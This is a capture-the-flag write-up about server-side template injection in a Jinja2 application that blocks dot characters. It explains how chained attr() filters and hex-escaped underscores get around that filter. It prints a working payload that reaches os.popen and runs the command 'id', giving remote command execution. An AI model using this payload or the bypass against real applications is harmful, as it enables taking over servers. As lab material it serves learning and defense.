
```

```

## Analysis

### Template Engine

Since the payload `{{3*3}}` is evaluated, the application is using a **Jinja2 template engine**, just like the previous challenge.

Normally, we could access Python internals with payloads such as:

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

However, this payload **fails** in this challenge.

---

### Input Filtering

Further testing revealed that:

- The **dot (`.`)** character is **blocked**
    
- Some attribute access patterns are filtered
    

Because of this restriction, the normal Jinja2 exploitation chain using dots cannot be used.

To bypass this restriction, we can use the **`attr` filter**, which allows attribute access **without using dots**.

---

## Exploitation / Solution

Instead of using `.` to access attributes, we chain multiple **`attr()` filters**.

### Payload

```jinja
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Explanation

This payload bypasses the **dot restriction** by using the `attr()` filter repeatedly.

Steps performed by the payload:

1. Start from the **request object**
    
2. Access the **application**
    
3. Retrieve **globals**
    
4. Access **builtins**
    
5. Call **`__import__`**
    
6. Import the **os** module
    
7. Execute the command `id`
    
8. Read the command output
    

Key bypass technique:

```
\x5f = _
```

So:

```
\x5f\x5fglobals\x5f\x5f = __globals__
```

This helps evade potential filtering of double underscores.

## Key Idea

Although **SSTI was present**, direct exploitation was blocked because:

- **`.` (dot) was filtered**
    
- Some attribute patterns were restricted
    

Using **Jinja2 filters like `attr()`** allows attribute access **without using dots**, enabling a full SSTI exploitation chain that leads to **remote command execution**.
